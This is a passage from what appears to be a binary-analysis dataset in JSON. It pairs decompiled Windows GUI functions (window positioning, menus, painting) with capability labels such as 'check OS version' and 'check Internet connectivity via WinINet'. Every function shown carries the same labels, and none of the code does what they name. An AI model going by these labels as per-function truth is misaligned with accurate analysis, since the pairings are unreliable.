sub.user32.dll_SetFocus();\n                    return;\n                }\n            }\n            goto code_r0x0043df88;\n        }\n        if (iVar6 == 0x2b) {\n            piVar3 = param_2[2];\n            if (((*piVar3 == 1) && (in_EAX[0xa4] != 0)) && (iVar6 = fcn.00436e3c(),  iVar6 != 0)) {\n                fcn.0042497c();\n                *in_FS_OFFSET = &stack0xffffffd0;\n                sub.gdi32.dll_SaveDC();\n                *in_FS_OFFSET = &stack0xffffffc0;\n                fcn.00424f48();\n                fcn.00424ddc();\n                piVar3 = *(piVar3 + 4);\n                puStack72 = 0x43dd94;\n                fcn.004385c4(piVar3);\n                *in_FS_OFFSET = piVar3;\n                fcn.00424f48();\n                puStack72 = 0x43ddbb;\n                sub.gdi32.dll_RestoreDC();\n                return;\n            }\n            goto code_r0x0043df88;\n        }\n        if (iVar6 == 0x2c) {\n            piVar3 = param_2[2];\n            if (((*piVar3 == 1) && (in_EAX[0xa4] != 0)) && (piVar4 = fcn.00436e3c(),  piVar4 != NULL)) {\n                fcn.00457a28();\n                uVar5 = sub.user32.dll_GetWindowDC();\n                *in_FS_OFFSET = &stack0xffffffcc;\n                fcn.0042497c();\n                *in_FS_OFFSET = &stack0xffffffc0;\n                puStack72 = 0x43de5e;\n                iVar6 = sub.gdi32.dll_SaveDC();\n                uStack76 = 0x43dec3;\n                piStack80 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb0;\n                puStack72 = &stack0xfffffffc;\n                fcn.00424f48();\n                fcn.00424ddc();\n                piVar3 = piVar3 + 4;\n                (**(*piVar4 + 0x38))();\n                *in_FS_OFFSET = piVar3;\n                uStack76 = 0x43deca;\n                piStack80 = 0x43deb5;\n                fcn.00424f48();\n                piStack80 = iVar6;\n                sub.gdi32.dll_RestoreDC(uVar5);\n                return;\n            }\n            goto code_r0x0043df88;\n        }\n        if (iVar6 == 0x46) {\n            if (*0x43dfa0 == (*(in_EAX + 7) & *0x43df9c)) {\n                if ((*(in_EAX + 0x9e) - 1U < 2) && (*(in_EAX + 0x273) != '\\x02')) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 2;\n                }\n                if (((*(in_EAX + 0x9e) == '\\x01') || (*(in_EAX + 0x9e) == '\\x03')) &&\n                   ((*(in_EAX + 0x271) == '\\x02' || (*(in_EAX + 0x271) == '\\x05')))) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 1;\n                }\n            }\n            goto code_r0x0043df88;\n        }\n    }\n    else {\n        if (iVar6 - 0x31eU < 2) {\n            fcn.00447320();\n            goto code_r0x0043df88;\n        }\n        if (iVar6 == 0xb01a) {\n            if (in_EAX[0x25] != 0) {\n                fcn.0040483c();\n            }\n            goto code_r0x0043df88;\n        }\n        if (iVar6 == 0xb01b) {\n            if (in_EAX[0x25] != 0) {\n                fcn.0040483c();\n            }\n            goto code_r0x0043df88;\n        }\n        if (iVar6 == 0xb047) {\n            iVar6 = param_2[1];\n            iVar2 = 0;\n            while ((iVar6 != 0 && (iVar2 == 0))) {\n                iVar2 = fcn.0044c724();\n                iVar6 = sub.user32.dll_GetParent();\n            }\n            if ((iVar2 != 0) &&\n               ((((piVar3 = fcn.0043b1a8(),  iVar2 != in_EAX[0x9a] || (iVar2 != *(*0x497c18 + 100))) && (piVar3 != NULL)\n                 ) && ((piVar3 == in_EAX || (piVar3 != *(*0x497c18 + 0x68))))))) {\n                if ((piVar3[0x9a] != 0) && (iVar2 != piVar3[0x9a])) {\n                    fcn.00450f7c(0);\n                }\n                (**(*piVar3 + 0xf8))();\n            }\n            goto code_r0x0043df88;\n        }\n    }\n    if (iVar6 == *0x497c20) {\n        fcn.00450f7c(0);\n        fcn.00450f7c(0);\n        fcn.00450f7c(0);\n        fcn.00450f7c(0);\n        fcn.00450f7c(0);\n        fcn.00450f7c(0);\n    }\ncode_r0x0043df88:\n    fcn.00454b24();\n    return;\n}\n",
        "token_count": 1773
    },
    "0043e030": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e030(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff6c;\n    int32_t iStack140;\n    uint *puStack136;\n    uchar *puStack132;\n    uint *puStack128;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_58h;\n    uint var_4ch;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    iVar2 = *param_2;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (iVar2 != 0xf) {\n        if (iVar2 == 0x14) {\n            fcn.00424860();\n            puStack128 = 0x43e09e;\n            (**(*var_4h + 0x44))();\n            puStack128 = &fcn.0043e030::var_6ch;\n            puStack132 = var_8h[1];\n            puStack136 = 0x43e0ae;\n            sub.user32.dll_FillRect();\n            if ((*(var_4h + 0x277) == '\\x02') && (var_4h[0xa7] != 0)) {\n                puStack136 = &fcn.0043e030::var_5ch;\n                iStack140 = var_4h[0xa7];\n                sub.user32.dll_GetClientRect();\n                uVar1 = fcn.00424860();\n                sub.user32.dll_FillRect(var_8h[1], &fcn.0043e030::var_5ch, uVar1);\n            }\n            var_8h[3] = 1;\n        }\n        else if (iVar2 == 0x3f) {\n            puStack128 = 0x43e10d;\n            fcn.0043dfa4(&stack0xfffffffc);\n            if (*(var_4h + 0x277) == '\\x02') {\n                iVar2 = fcn.0043e940();\n                if (iVar2 != 0) {\n                    puStack128 = 0x43e130;\n                    fcn.0043dff0(&stack0xfffffffc);\n                }\n                fcn.0043aba4();\n            }\n        }\n        else if (iVar2 == 0x84) {\n            puStack128 = 0x43e067;\n            fcn.0043dfa4(&stack0xfffffffc);\n            if (var_8h[3] == 1) {\n                var_8h[3] = -1;\n            }\n        }\n        else {\n            puStack128 = 0x43e20b;\n            fcn.0043dfa4(&stack0xfffffffc);\n        }\n        return;\n    }\n    var_ch = param_2[1];\n    if (var_ch == 0) {\n        puStack128 = in_EAX[0xa7];\n        puStack132 = 0x43e170;\n        iVar2 = sub.user32.dll_BeginPaint();\n        var_8h[1] = iVar2;\n    }\n    puStack136 = 0x43e1fe;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &stack0xfffffffc;\n    if (var_ch == 0) {\n        in_stack_ffffff6c = var_4h[0xa7];\n        puStack132 = &stack0xfffffffc;\n        sub.user32.dll_GetWindowRect(in_stack_ffffff6c, &fcn.0043e030::var_5ch);\n        fcn.0044f804();\n        fcn.0044e2d0();\n    }\n    fcn.00455180();\n    *in_FS_OFFSET = in_stack_ffffff6c;\n    iStack140 = 0x43e20c;\n    if (var_ch == 0) {\n        sub.user32.dll_EndPaint(var_4h[0xa7], &fcn.0043e030::var_4ch);\n    }\n    return;\n}\n",
        "token_count": 953
    },
    "0043e314": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043e314(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0xa3) == '\\0') {\n        *(in_EAX + 0xa3) = 1;\n        uStack20 = 0x43e394;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack24;\n        if (*(in_EAX + 0x18) != '\\0') {\n            if (in_EAX[0xc] == 0) {\n                puStack16 = &stack0xfffffffc;\n                (**(*in_EAX + 0x74))();\n            }\n            else {\n                (**(*in_EAX + 0x74))();\n            }\n            (**(*in_EAX + 0x70))();\n        }\n        *in_FS_OFFSET = uStack24;\n        *(in_EAX + 0xa3) = 0;\n        return;\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "0043e5bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __cdecl fcn.0043e5bc(uint32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t *in_ECX;\n    uint32_t *in_EDX;\n    \n    *in_EDX = *in_EDX & 0x7f3bff7f;\n    *in_ECX = *in_ECX & 0xfffffe7e;\n    *arg_8h = *arg_8h & 0xffffd7ff;\n    cVar1 = *(in_EAX + 0x271);\n    if ((*(in_EAX + 0x277) == '\\x01') && ((cVar1 == '\\0' || (cVar1 == '\\x03')))) {\n        cVar1 = '\\x02';\n    }\n    // switch table (6 cases) at 0x43e60a\n    switch(cVar1) {\n    case '\\0':\n        if ((*(in_EAX + 0x30) == 0) && (*(in_EAX + 0x1c4) == 0)) {\n            *in_EDX = *in_EDX | 0x80000000;\n        }\n        break;\n    case '\\x01':\n    case '\\x04':\n        *in_EDX = *in_EDX | 0xc00000;\n        break;\n    case '\\x02':\n    case '\\x05':\n        *in_EDX = *in_EDX | 0xc40000;\n        break;\n    case '\\x03':\n        if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n            *in_EDX = *in_EDX | 0x80c00000;\n        }\n        else {\n            *in_EDX = *in_EDX | 0xc00000;\n        }\n        *in_ECX = *in_ECX | 0x101;\n        if (**0x4927f4 == '\\0') {\n            *in_EDX = *in_EDX | 0x400080;\n        }\n        *arg_8h = *arg_8h | 0x2808;\n    }\n    if ((cVar1 - 4U < 2) && (*(in_EAX + 0x277) != '\\x01')) {\n        *in_ECX = *in_ECX | 0x80;\n    }\n    return cVar1 + -6;\n}\n",
        "token_count": 548
    },
    "0043e6d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e6d0(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    if (param_2 != *(in_EAX + 0x271)) {\n        *(in_EAX + 0x271) = param_2;\n        uStack24 = 0x43e70e;\n        fcn.0043c058();\n        uStack24 = 0x43e715;\n        cVar1 = fcn.00457d34();\n        if ((cVar1 != '\\0') && (((*(in_EAX + 7) & 0x10) == 0 || (((*(in_EAX + 7) & 0x10) != 0 && (in_EAX[0xc] != 0))))))\n        {\n            uStack24 = 0xfffffff0;\n            uStack28 = 0x43e740;\n            uStack28 = fcn.00457a28();\n            uStack32 = 0x43e746;\n            uStack28 = sub.user32.dll_GetWindowLongA();\n            uStack32 = 0xffffffec;\n            uStack36 = 0x43e752;\n            uStack36 = fcn.00457a28();\n            uStack32 = sub.user32.dll_GetWindowLongA();\n            uVar2 = fcn.00457a28(0xffffffe6);\n            uStack36 = sub.user32.dll_GetClassLongA(uVar2);\n            puVar4 = &stack0xffffffdc;\n            fcn.0040483c(puVar4);\n            fcn.0040483c();\n            uVar3 = 0xfffffff0;\n            uVar2 = fcn.00457a28(0xfffffff0, puVar4);\n            sub.user32.dll_SetWindowLongA(uVar2);\n            uVar2 = fcn.00457a28(0xffffffec, uVar3);\n            sub.user32.dll_SetWindowLongA(uVar2);\n            uVar2 = fcn.00457a28(0xffffffe6, uVar3);\n            sub.user32.dll_SetClassLongA(uVar2);\n            cVar1 = fcn.00457d34();\n            if (cVar1 != '\\0') {\n                if (**0x4927f4 != '\\0') {\n                    if (*(in_EAX + 0x271) == '\\x03') {\n                        uVar2 = fcn.00457a28(0x80, 1, 0);\n                        sub.user32.dll_SendMessageA(uVar2);\n                    }\n                    else {\n                        uVar2 = fcn.0044055c();\n                        uVar2 = fcn.00457a28(0x80, 1, uVar2);\n                        sub.user32.dll_SendMessageA(uVar2);\n                    }\n                }\n                uVar2 = fcn.00457a28(0xffffffff);\n                sub.user32.dll_GetSystemMenu(uVar2);\n                fcn.00450f7c(0);\n            }\n            uVar2 = fcn.00457a28(0, 0, 0, 0, 0, 0x37);\n            sub.user32.dll_SetWindowPos(uVar2);\n            (**(*in_EAX + 0x80))();\n        }\n    }\n    return;\n}\n",
        "token_count": 778
    },
    "0043e90c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043e90c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) {\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x29c), 0x229, 0, 0);\n        uVar1 = fcn.0044c724();\n    }\n    return uVar1;\n}\n",
        "token_count": 123
    },
    "0043e940": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043e940(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) && (iVar1 = fcn.0044321c(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.00443208();\n            if (*(iVar2 + 0x277) == '\\x01') {\n                iVar3 = iVar3 + 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return iVar3;\n}\n",
        "token_count": 180
    },
    "0043e98c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043e98c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) && (iVar1 = fcn.0044321c(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.00443208();\n            if ((*(iVar2 + 0x277) == '\\x01') && (param_2 = param_2 + -1,  param_2 < 0)) {\n                return iVar2;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 196
    },
    "0043eaf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043eaf0(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0x277)) {\n        if (((param_2 != '\\0') || (*(in_EAX + 0x277) != '\\x03')) && ((param_2 != '\\x03' || (*(in_EAX + 0x277) != '\\0')))\n           ) {\n            if ((param_2 == '\\x01') && (*(in_EAX + 0x9e) == '\\0')) {\n                puStack20 = 0x43eba5;\n                fcn.0043eff8();\n            }\n            bVar3 = (*(in_EAX + 7) & 0x10) == 0;\n            if (bVar3) {\n                puStack20 = 0x43ebc4;\n                fcn.00458dc8();\n            }\n            uStack24 = 0x43ec58;\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            puStack20 = &stack0xfffffffc;\n            if (bVar3) {\n                puStack20 = &stack0xfffffffc;\n                (**(*in_EAX + 0xb0))();\n            }\n            cVar1 = *(in_EAX + 0x277);\n            *(in_EAX + 0x277) = param_2;\n            if (((param_2 == '\\x02') || (cVar1 == '\\x02')) && (*(in_EAX + 0x1d9) == '\\0')) {\n                fcn.0043f130();\n                fcn.0044fe38();\n            }\n            if (bVar3) {\n                fcn.004545e8();\n            }\n            if (param_2 == '\\x01') {\n                fcn.0043d824();\n            }\n            *in_FS_OFFSET = uStack28;\n            puStack20 = 0x43ec5f;\n            if (bVar3) {\n                uStack24 = 0x43ec57;\n                fcn.00458dc8();\n            }\n            return;\n        }\n        *(in_EAX + 0x277) = param_2;\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            puStack20 = 0x43eb4a;\n            cVar1 = fcn.00457d34();\n            if (cVar1 != '\\0') {\n                puStack20 = 0x213;\n                uStack24 = 0;\n                uStack28 = 0;\n                uVar2 = fcn.00457a28(*((*(in_EAX + 0x277) == '\\x03') * 4 + 0x491550), 0, 0);\n                sub.user32.dll_SetWindowPos(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 701
    },
    "0043ec64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043ec64(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    if ((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) {\n        iVar3 = 0;\n        if (*(in_EAX + 0x290) != NULL) {\n            iVar3 = (**(**(in_EAX + 0x290) + 0x34))();\n        }\n        uVar4 = 0;\n        if (*(in_EAX + 0x2a0) != 0) {\n            uVar4 = fcn.00433e6c();\n        }\n        uVar1 = fcn.00457a28();\n        iVar2 = sub.user32.dll_GetMenu(uVar1);\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x29c), 0x230, iVar3, uVar4);\n        if (iVar3 != iVar2) {\n            uVar4 = fcn.00457a28();\n            sub.user32.dll_DrawMenuBar(uVar4);\n        }\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "0043ed2c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043ed2c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint *arg_ch;\n    uint arg_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    if ((param_2 != 0) && (iVar2 = fcn.0044321c(),  -1 < iVar2 + -1)) {\n        do {\n            var_4h = iVar2;\n            iVar2 = fcn.00443208();\n            if ((param_2 == *(iVar2 + 0x290)) && (iVar2 = fcn.00443208(),  in_EAX != iVar2)) {\n                var_ch = *(param_2 + 8);\n                var_8h._0_1_ = 0xb;\n                arg_ch = &var_ch;\n                arg_8h = 0;\n                fcn.004075f4();\n                fcn.0040daac(arg_8h, arg_ch);\n                fcn.00404eb4();\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != 0);\n    }\n    if (*(in_EAX + 0x290) != 0) {\n        fcn.004376e0();\n    }\n    if (((*(in_EAX + 0x1c) & 8) != 0) || ((param_2 != 0 && ((*(param_2 + 0x1c) & 8) != 0)))) {\n        param_2 = 0;\n    }\n    *(in_EAX + 0x290) = param_2;\n    if ((param_2 == 0) || ((fcn.0041f90c(),  (*(in_EAX + 0x1c) & 0x10) == 0 && (*(in_EAX + 0x271) == '\\x03')))) {\n        cVar1 = fcn.00457d34();\n        if (cVar1 != '\\0') {\n            uVar4 = fcn.00457a28(0);\n            sub.user32.dll_SetMenu(uVar4);\n        }\n    }\n    else if (((*(*(in_EAX + 0x290) + 0x5c) == '\\0') && (*(in_EAX + 0x277) != '\\x01')) ||\n            ((*(in_EAX + 0x1c) & 0x10) != 0)) {\n        cVar1 = fcn.00457d34();\n        if (cVar1 != '\\0') {\n            iVar2 = (**(**(in_EAX + 0x290) + 0x34))();\n            arg_8h = fcn.00457a28();\n            iVar3 = sub.user32.dll_GetMenu();\n            if (iVar2 != iVar3) {\n                (**(**(in_EAX + 0x290) + 0x34))();\n                arg_8h = fcn.00457a28();\n                sub.user32.dll_SetMenu();\n            }\n            fcn.00457a28();\n            fcn.004376e0();\n        }\n    }\n    else if ((*(in_EAX + 0x277) != '\\x01') && (cVar1 = fcn.00457d34(),  cVar1 != '\\0')) {\n        uVar4 = fcn.00457a28(0);\n        sub.user32.dll_SetMenu(uVar4);\n    }\n    if (*(in_EAX + 0x276) != '\\0') {\n        fcn.004403e8();\n    }\n    fcn.0043ec64();\n    if (((*(in_EAX + 0x298) != 0) && ((*(in_EAX + 0x1c) & 0x10) != 0)) && (*(in_EAX + 0x30) != 0)) {\n        uVar4 = fcn.00457a28(0, 0, 0, 0, 0, 0x37);\n        sub.user32.dll_SetWindowPos(uVar4);\n        fcn.00450f7c(0);\n        fcn.00450f7c(0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 1044
    },
    "0043ef68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043ef68(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x32c) == 0) {\n        uVar1 = fcn.00404610();\n        *(in_EAX + 0x32c) = uVar1;\n    }\n    return *(in_EAX + 0x32c);\n}\n",
        "token_count": 90
    },
    "0043ef90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043ef90(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x338) == 0) {\n        uVar1 = fcn.00404610();\n        *(in_EAX + 0x338) = uVar1;\n    }\n    return *(in_EAX + 0x338);\n}\n",
        "token_count": 87
    },
    "0043f0c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0043f0c8(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + 0x2a4) & 0xffffff00 | **(in_EAX + 0x2a4) != 0;\n}\n",
        "token_count": 63
    },
    "0043f1cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f1cc(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (((param_2 != *(in_EAX + 0x273)) && (*(in_EAX + 0x273) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) &&\n       (*(in_EAX + 0x1da) != '\\0')) {\n        uVar1 = fcn.00457a28(*(param_2 * 4 + 0x491558));\n        sub.user32.dll_ShowWindow(uVar1);\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "0043f20c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043f20c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iStack20;\n    \n    if ((*(in_EAX + 0x279) != '\\0') && (*(*0x497c14 + 0x44) != 0)) {\n        iVar10 = 0;\n        if (*(in_EAX + 0x279) == '\\x02') {\n            iVar10 = fcn.0043ea0c();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if ((*(in_EAX + 0x279) == '\\x03') && (*(*0x497c18 + 0x68) != 0)) {\n            iVar10 = fcn.0043ea0c();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if (*(in_EAX + 0x279) == '\\x01') {\n            iVar10 = fcn.004440e8();\n            iVar10 = *(iVar10 + 4);\n        }\n        iVar1 = fcn.0043ea0c();\n        iVar1 = *(iVar1 + 4);\n        iStack20 = fcn.004431ec();\n        if (-1 < iStack20 + -1) {\n            do {\n                iVar2 = fcn.004431d8();\n                if (((*(iVar2 + 4) == iVar10) && (iVar10 != iVar1)) && (iVar2 = fcn.004431ec(),  -1 < iVar2 + -1)) {\n                    iVar11 = 0;\n                    do {\n                        iVar3 = fcn.004431d8(iVar10, iVar1, iVar11);\n                        if (*(iVar3 + 4) == iVar1) {\n                            if (*(in_EAX + 0x9e) == '\\x04') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.004431d8(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.00442eb8();\n                                fcn.004431d8(iVar4);\n                                iVar5 = fcn.00442e9c();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.004431d8(iVar4 + iVar3);\n                                fcn.00442e84();\n                                fcn.004431d8();\n                                fcn.00442ed0();\n                                (**(*in_EAX + 0x88))();\n                            }\n                            else if (*(in_EAX + 0x9e) == '\\x06') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.004431d8(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.00442eb8();\n                                fcn.004431d8(iVar4);\n                                iVar5 = fcn.00442e9c();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.004431d8(iVar4 + iVar3);\n                                fcn.00442e84();\n                                fcn.004431d8();\n                                fcn.00442ed0();\n                                (**(*in_EAX + 0x88))();\n                            }\n                            else {\n                                fcn.004431d8(iVar10, iVar1, iVar11);\n                                iVar3 = fcn.00442e84();\n                                iVar4 = fcn.0043d3b4();\n                                fcn.004431d8();\n                                iVar5 = fcn.00442e84();\n                                fcn.004431d8();\n                                iVar7 = fcn.00442e84();\n                                fcn.004431d8();\n                                iVar8 = fcn.00442ed0();\n                                if (iVar7 + iVar8 < in_EAX[0x12] + ((iVar3 + iVar4) - iVar5)) {\n                                    fcn.004431d8();\n                                    fcn.00442e84();\n                                    fcn.004431d8();\n                                    fcn.00442ed0();\n                                }\n                                fcn.004431d8();\n                                iVar3 = fcn.00442eb8();\n                                iVar4 = fcn.0043d3d4();\n                                iVar3 = iVar3 + iVar4;\n                                fcn.004431d8();\n                                iVar4 = fcn.00442eb8();\n                                fcn.004431d8();\n                                iVar5 = fcn.00442eb8();\n                                fcn.004431d8();\n                                iVar7 = fcn.00442e9c();\n                                if (iVar5 + iVar7 < (iVar3 - iVar4) + in_EAX[0x13]) {\n                                    fcn.004431d8();\n                                    uVar9 = fcn.00442eb8();\n                                    fcn.004431d8(uVar9);\n                                    fcn.00442e9c();\n                                }\n                                (**(*in_EAX + 0x88))(in_EAX[0x13], in_EAX[0x12]);\n                            }\n                        }\n                        iVar11 = iVar11 + 1;\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n                iStack20 = iStack20 + -1;\n            } while (iStack20 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 1308
    },
    "0043fbc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
